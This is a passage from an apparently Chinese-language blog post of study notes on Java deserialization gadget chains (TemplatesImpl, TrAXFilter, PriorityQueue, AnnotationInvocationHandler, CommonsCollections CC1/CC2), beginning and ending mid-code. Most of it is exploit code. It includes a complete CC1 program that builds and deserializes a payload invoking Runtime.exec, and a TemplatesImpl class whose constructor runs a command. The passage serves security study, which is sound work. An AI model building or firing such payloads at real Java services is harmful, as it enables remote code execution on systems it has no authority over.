    Map map = (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(), new Class[]&#123;Map.class&#125;, convertedClosure);
    //初始化
    InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);
    //序列化
    String serialize = serialize(invocationHandler);
    System.out.println(serialize);
    //反序列化
    unserialize(serialize);
</code></pre>
<h3 id="TemplatesImpl依赖-newTransformer-RCE"><a href="#TemplatesImpl依赖-newTransformer-RCE" class="headerlink" title="TemplatesImpl依赖     newTransformer &#x3D; RCE"></a>TemplatesImpl依赖     newTransformer &#x3D; RCE</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">public final class TemplatesImpl implements Templates, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    private String _name = null;</span><br><span class="line">    private byte[][] _bytecodes = null;</span><br><span class="line">    private transient TransformerFactoryImpl _tfactory = null;</span><br><span class="line"></span><br><span class="line">    //关键方法：newTransformer()</span><br><span class="line">    public synchronized Transformer newTransformer()</span><br><span class="line">                throws TransformerConfigurationException</span><br><span class="line">            &#123;</span><br><span class="line">                TransformerImpl transformer;</span><br><span class="line">                // 关键点，调用 getTransletInstance()</span><br><span class="line">                transformer = new TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">                    _indentNumber, _tfactory);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //继续跟进 getTransletInstance() 方法：</span><br><span class="line">    private Translet getTransletInstance()</span><br><span class="line">        throws TransformerConfigurationException &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            if (_name == null) return null;</span><br><span class="line"></span><br><span class="line">            //先判断是否为 null，如果为 null 的话去加载字节码，紧接着 newInstance() 对其实例化。</span><br><span class="line">            if (_class == null) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">            …………</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //继续跟进 defineTransletClasses() 方法:</span><br><span class="line">    private void defineTransletClasses()</span><br><span class="line">        throws TransformerConfigurationException &#123;</span><br><span class="line">        …………</span><br><span class="line">        TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(new PrivilegedAction() &#123;</span><br><span class="line">                public Object run() &#123;</span><br><span class="line">                    return new TransletClassLoader(ObjectFactory.findClassLoader());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        …………</span><br><span class="line">            for (int i = 0; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);  //关键点</span><br><span class="line">                final Class superClass = _class[i].getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    //继续跟进 TransletClassLoader，这个类里重写了 defineClass 方法</span><br><span class="line">    static final class TransletClassLoader extends ClassLoader &#123;</span><br><span class="line">        TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">            super(parent);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class defineClass(final byte[] b) &#123;</span><br><span class="line">            return defineClass(null, b, 0, b.length);   //关键点</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="TemplatesImpl-newTransformer-rce-前TrAXFilter-InvokerTransformer-transform"><a href="#TemplatesImpl-newTransformer-rce-前TrAXFilter-InvokerTransformer-transform" class="headerlink" title="TemplatesImpl.newTransformer() rce   前TrAXFilter|InvokerTransformer.transform()"></a>TemplatesImpl.newTransformer() rce   前TrAXFilter|InvokerTransformer.transform()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">byte[] code = Base64.decode(&quot;&quot;); # code可以从下面注意事项或上面通用方法获得</span><br><span class="line"></span><br><span class="line">//反射设置 Field</span><br><span class="line">TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;code&#125;);</span><br><span class="line">setFieldValue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);</span><br><span class="line">setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure>
<h5 id="这里有有一点需要注意，-HelloTemplatesImpl-java，主要其必须继承-AbstractTranslet-类-why"><a href="#这里有有一点需要注意，-HelloTemplatesImpl-java，主要其必须继承-AbstractTranslet-类-why" class="headerlink" title="这里有有一点需要注意， HelloTemplatesImpl.java，主要其必须继承 AbstractTranslet 类. why?????"></a>这里有有一点需要注意， HelloTemplatesImpl.java，主要其必须继承 AbstractTranslet 类. why?????</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// HelloTemplatesImpl.java</span><br><span class="line">public class HelloTemplatesImpl extends AbstractTranslet &#123;</span><br><span class="line"></span><br><span class="line">    public HelloTemplatesImpl() &#123;</span><br><span class="line">        super();</span><br><span class="line">        try&#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="TrAXFilter-后newTransformer"><a href="#TrAXFilter-后newTransformer" class="headerlink" title="TrAXFilter  后newTransformer()"></a>TrAXFilter  后newTransformer()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class TrAXFilter extends XMLFilterImpl &#123;</span><br><span class="line"></span><br><span class="line">    //构造函数</span><br><span class="line">    public TrAXFilter(Templates templates)  throws</span><br><span class="line">        TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        _templates = templates;</span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();    //关键点</span><br><span class="line">        …………</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="如何调用TrAXFilter-有CC时可"><a href="#如何调用TrAXFilter-有CC时可" class="headerlink" title="如何调用TrAXFilter  有CC时可"></a>如何调用TrAXFilter  有CC时可</h4><p>演示代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Transformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;); </span><br><span class="line"># templates 可以在newTransformer()处找到代码</span><br><span class="line">instantiateTransformer.transform(TrAXFilter.class);</span><br></pre></td></tr></table></figure>
<p>实际调用时候 需要被封到 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//Transformer数组</span><br><span class="line">Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">        new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">        new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>
<h3 id="TransformingComparator-前PriorityQueue-后-transformer-transform-即CC"><a href="#TransformingComparator-前PriorityQueue-后-transformer-transform-即CC" class="headerlink" title="TransformingComparator  前PriorityQueue.  后   transformer.transform() 即CC"></a>TransformingComparator  前PriorityQueue.  后   transformer.transform() 即CC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public class TransformingComparator&lt;I, O&gt; implements Comparator&lt;I&gt;, Serializable &#123;</span><br><span class="line">    private static final long serialVersionUID = 3456940356043606220L;</span><br><span class="line">    private final Comparator&lt;O&gt; decorated;</span><br><span class="line">    private final Transformer&lt;? super I, ? extends O&gt; transformer;</span><br><span class="line"></span><br><span class="line">    public TransformingComparator(Transformer&lt;? super I, ? extends O&gt; transformer) &#123;</span><br><span class="line">        this(transformer, ComparatorUtils.NATURAL_COMPARATOR);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int compare(I obj1, I obj2) &#123;</span><br><span class="line">        //关键点</span><br><span class="line">        O value1 = this.transformer.transform(obj1);</span><br><span class="line">        O value2 = this.transformer.transform(obj2);</span><br><span class="line">        return this.decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用code</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//为了执行 templates.newTransformer</span><br><span class="line">InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">//TransformingComparator 实例</span><br><span class="line">TransformingComparator comparator = new TransformingComparator(invokerTransformer);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="PriorityQueue-source-后-Comparator-compare-即TransformingComparator-compare"><a href="#PriorityQueue-source-后-Comparator-compare-即TransformingComparator-compare" class="headerlink" title="PriorityQueue  source. 后 Comparator.compare  即TransformingComparator.compare()"></a>PriorityQueue  source. 后 Comparator.compare  即TransformingComparator.compare()</h3><p>其反序列化时调用 readObject 方法，然后最终会调用 我们自定义的 Comparator 的 compare 方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">public class PriorityQueue&lt;E&gt; extends AbstractQueue&lt;E&gt; implements java.io.Serializable &#123;</span><br><span class="line">    private transient Object[] queue;   //关键点，可以传入 TemplatesImpl</span><br><span class="line">    private final Comparator&lt;? super E&gt; comparator;     //关键点可以反射设置我们自己的 Comparator</span><br><span class="line"></span><br><span class="line">    //关键点，反序列化时字段执行的 readObject</span><br><span class="line">    private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">        throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        //关键点，调用 heapify() 排序</span><br><span class="line">        heapify();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //跟进 heapify() 方法</span><br><span class="line">    private void heapify() &#123;</span><br><span class="line">        for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)</span><br><span class="line">            siftDown(i, (E) queue[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //跟进 siftDown 方法，如果 comparator 不为空，调用 siftDownUsingComparator</span><br><span class="line">    private void siftDown(int k, E x) &#123;</span><br><span class="line">        if (comparator != null)</span><br><span class="line">            siftDownUsingComparator(k, x);</span><br><span class="line">        else</span><br><span class="line">            siftDownComparable(k, x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //跟进 siftDownUsingComparator 方法，可以看到这里调用了我们自定义的 Comparator</span><br><span class="line">    private void siftDownUsingComparator(int k, E x) &#123;</span><br><span class="line">        int half = size &gt;&gt;&gt; 1;</span><br><span class="line">        while (k &lt; half) &#123;</span><br><span class="line">            int child = (k &lt;&lt; 1) + 1;</span><br><span class="line">            Object c = queue[child];</span><br><span class="line">            int right = child + 1;</span><br><span class="line">            if (right &lt; size &amp;&amp;</span><br><span class="line">                comparator.compare((E) c, (E) queue[right]) &gt; 0)    //关键点</span><br><span class="line">                c = queue[child = right];</span><br><span class="line">            if (comparator.compare(x, (E) c) &lt;= 0)</span><br><span class="line">                break;</span><br><span class="line">            queue[k] = c;</span><br><span class="line">            k = child;</span><br><span class="line">        &#125;</span><br><span class="line">        queue[k] = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//PriorityQueue 实例</span><br><span class="line">PriorityQueue priorityQueue = new PriorityQueue(2);</span><br><span class="line">//先设置为正常变量值，后面可以通过setFieldValue修改</span><br><span class="line">priorityQueue.add(1);</span><br><span class="line">priorityQueue.add(1);</span><br><span class="line"></span><br><span class="line">//反射设置 Field</span><br><span class="line">Object[] objects = new Object[]&#123;templates, templates&#125;;  //templates是TemplatesImpl 实例</span><br><span class="line">setFieldValue(priorityQueue, &quot;queue&quot;, objects); //comparator是TransformingComparator  实例，这个实例调用newTransformer</span><br><span class="line">setFieldValue(priorityQueue, &quot;comparator&quot;, comparator);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="AnnotationInvocationHandler-原生类-后LazyMap-get"><a href="#AnnotationInvocationHandler-原生类-后LazyMap-get" class="headerlink" title="AnnotationInvocationHandler  原生类  后LazyMap.get()"></a>AnnotationInvocationHandler  原生类  后LazyMap.get()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123;</span><br><span class="line">    private final Class&lt;? extends Annotation&gt; type;</span><br><span class="line">    private final Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    //构造函数，可传入 LazyMap</span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        this.type = var1;</span><br><span class="line">        this.memberValues = var2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //利用 invoke 方法可实现调用 LazyMap#get</span><br><span class="line">    public Object invoke(Object var1, Method var2, Object[] var3) &#123;</span><br><span class="line">        Object var6 = this.memberValues.get(var4);</span><br><span class="line">    &#125;</span><br><span class="line">    # AnnotationInvocationHandler 类 readObject 方法代码：关键点在 this.memberValues.entrySet() ，这里我们可以为 memberValues 传入一个代理对象。通过 java 的动态代理机制，使其最终触发 AnnotationInvocationHandler 类的 invoke 方法，从而实现触发 LazyMap.get()。 </span><br><span class="line">    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = null;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(this.type);</span><br><span class="line">        &#125; catch (IllegalArgumentException var9) &#123;</span><br><span class="line">            throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        Iterator var4 = this.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        while(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();</span><br><span class="line">            String var6 = (String)var5.getKey();</span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            if (var7 != null) &#123;</span><br><span class="line">                Object var8 = var5.getValue();</span><br><span class="line">                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="AnnotationInvocationHandler的constructor-后LazyMap-get-可参照微调成其他类的get"><a href="#AnnotationInvocationHandler的constructor-后LazyMap-get-可参照微调成其他类的get" class="headerlink" title="AnnotationInvocationHandler的constructor    后LazyMap.get()   可参照微调成其他类的get();"></a>AnnotationInvocationHandler的constructor    后LazyMap.get()   可参照微调成其他类的get();</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//反射获取AnnotationInvocationHandler实例  为什么要用反射  因为没有写明public之类的声明，所以说明这个类只能在sun.reflect.annotation这个本包下被调用，我们要想在外部调用，需要用到反射来解决</span><br><span class="line">Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(true);</span><br><span class="line">InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">//动态代理类，设置一个D代理对象，为了触发 AnnotationInvocationHandler#invoke           </span><br><span class="line">Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);</span><br><span class="line"></span><br><span class="line">InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="动态代理可以调用任意get方法-具体看7u21"><a href="#动态代理可以调用任意get方法-具体看7u21" class="headerlink" title="动态代理可以调用任意get方法  具体看7u21"></a>动态代理可以调用任意get方法  具体看7u21</h4><pre><code>    public Object invoke(Object var1, Method var2, Object[] var3) &#123;
        String var4 = var2.getName();
        Class[] var5 = var2.getParameterTypes();
        if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) &#123;
            return this.equalsImpl(var3[0]);

    //再跟进这个equalsImpl()方法：

    private Boolean equalsImpl(Object var1) &#123;
        if (var1 == this) &#123;
            return true;
        &#125; else if (!this.type.isInstance(var1)) &#123;
            return false;
        &#125; else &#123;
            Method[] var2 = this.getMemberMethods();
            int var3 = var2.length;

            for(int var4 = 0; var4 &lt; var3; ++var4) &#123;
                Method var5 = var2[var4];
                String var6 = var5.getName();
                Object var7 = this.memberValues.get(var6);
                Object var8 = null;
                AnnotationInvocationHandler var9 = this.asOneOfUs(var1);
                if (var9 != null) &#123;
                    var8 = var9.memberValues.get(var6);
                &#125; else &#123;
                    try &#123;
                        var8 = var5.invoke(var1);
                    &#125; catch (InvocationTargetException var11) &#123;
                        return false;
                    &#125; catch (IllegalAccessException var12) &#123;
                        throw new AssertionError(var12);
                    &#125;
                &#125;

                if (!memberValueEquals(var7, var8)) &#123;
                    return false;
                &#125;
            &#125;

            return true;
        &#125;
    &#125;
    //前两个if不用管，直接看else。通过getMemberMethods得到一个Method[]：

    private Method[] getMemberMethods() &#123;
        if (this.memberMethods == null) &#123;
            this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction&lt;Method[]&gt;() &#123;
                public Method[] run() &#123;
                    Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();
                    AccessibleObject.setAccessible(var1, true);
                    return var1;
                &#125;
            &#125;);
        &#125;

        return this.memberMethods;
        //然后进入for循环，遍历这个Method[]，然后调用方法：

        //        if (var9 != null) &#123;
        //            var8 = var9.memberValues.get(var6);
        //这里的Method[]只能是通过this.type来得到：
        //AnnotationInvocationHandler.this.type.getDeclaredMethods();
        //因为memberMethods属性是个瞬态属性不可控。

        //private transient volatile Method[] memberMethods = null;
        ///因此总的来说可以利用的就是，得到this.type的所有Method[]，然后依次调用所有。如果让this.type是TemplatesImpl的类的话，就自然会调用到newTransformer或者getOutputProperties。
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">## 成熟链</span><br><span class="line">### CC1   8u65  3.2.1 可用  1.8 8u71版本以后，对AnnotationInvocationHandler的readobject进行了改写。导致高版本中利用链无法使用。CC1在commons-collections-4.0可用</span><br><span class="line">https://xz.aliyun.com/t/12669?time__1311=GqGxuDRiD%3Dit%3DGN4eeqBKWu4fO6iKFoa4D#toc-4  perfect</span><br><span class="line"></span><br><span class="line">https://xz.aliyun.com/t/9409?time__1311=n4%2BxnD0Du0eGwwDBqooGkDRDRg4fx200our2bD#toc-0这个踩坑，里面CC1不对</span><br></pre></td></tr></table></figure>
-&gt;AnnotationInvocationHandler.readObject()
      -&gt;mapProxy.entrySet().iterator()  //动态代理类
          -&gt;AnnotationInvocationHandler.invoke()
            -&gt;LazyMap.get()
                -&gt;ChainedTransformer.transform()
                -&gt;ConstantTransformer.transform()
                    -&gt;InvokerTransformer.transform()
                    -&gt;…………
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">####完整代码</span><br></pre></td></tr></table></figure>
public static void main(String[] args) throws Exception &#123;
        Class rc=Class.*forName*(&quot;java.lang.Runtime&quot;);
        Transformer[] Transformers=new Transformer[]&#123;
                new ConstantTransformer(Runtime.class), //添加此行代码，这里解决问题三
                new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
        &#125;;
        ChainedTransformer chainedTransformer= new ChainedTransformer(Transformers);
    //上述利用反射获取类原型+transformer数组＋chainedtransformer遍历实现transform方法，来解决问题一中的无法序列化问题。

        HashMap&lt;Object,Object&gt; map=new HashMap&lt;&gt;();
        map.put(&quot;value&quot;,&quot;gxngxngxn&quot;); //这里是问题二中改键值对的值为注解中成员变量的名称，通过if判断
        Map&lt;Object,Object&gt; transformedmap=TransformedMap.*decorate*(map,null,chainedTransformer);
        Class c=Class.*forName*(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object o=constructor.newInstance(Target.class,transformedmap); //这里是问题二中第一个参数改注解为Target
        *serialize*(o);
        *unserialize*(&quot;C://java/CC1.txt&quot;);
    &#125;
    public static void serialize(Object object) throws Exception&#123;
        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;C://java/CC1.txt&quot;));
        oos.writeObject(object);
    &#125;
    public static void unserialize(String filename) throws Exception&#123;
        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream(filename));
        objectInputStream.readObject();
    &#125;
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">### CC2 commons-collections-4.0</span><br></pre></td></tr></table></figure>
Gadget chain:
        ObjectInputStream.readObject()
            PriorityQueue.readObject()
                ...
                    TransformingComparator.compare()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Runtime.exec()
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">public class cc2 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span><br><span class="line">        String 